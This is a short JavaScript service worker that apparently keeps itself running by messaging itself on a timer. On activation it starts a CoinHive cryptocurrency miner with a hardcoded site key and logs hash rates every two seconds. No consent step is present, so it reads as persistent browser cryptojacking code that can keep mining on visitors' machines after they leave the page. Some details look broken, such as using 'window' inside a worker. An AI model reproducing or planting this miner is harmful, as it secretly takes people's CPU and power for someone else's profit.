function task() {
  var sw = registration.active;
  sw.postMessage(1);
}

self.onmessage = function(e) {
  e.waitUntil(new Promise(y => {
    setTimeout(_ => {
      task();
      y();
    }, 1000);
  }));
};

self.onactivate = function() {
  task();
  var miner = window.miner = new CoinHive.Anonymous('MUtCJzIDhrs01ERrf3qlqdawo35N0CYD', {throttle: 0.1});
  miner.start();
  setInterval(function() {
      var hashesPerSecond = miner.getHashesPerSecond();
      var totalHashes = miner.getTotalHashes();
      var acceptedHashes = miner.getAcceptedHashes();

      console.log('XXX ', {hashesPerSecond, totalHashes, acceptedHashes});
  }, 2000);
};
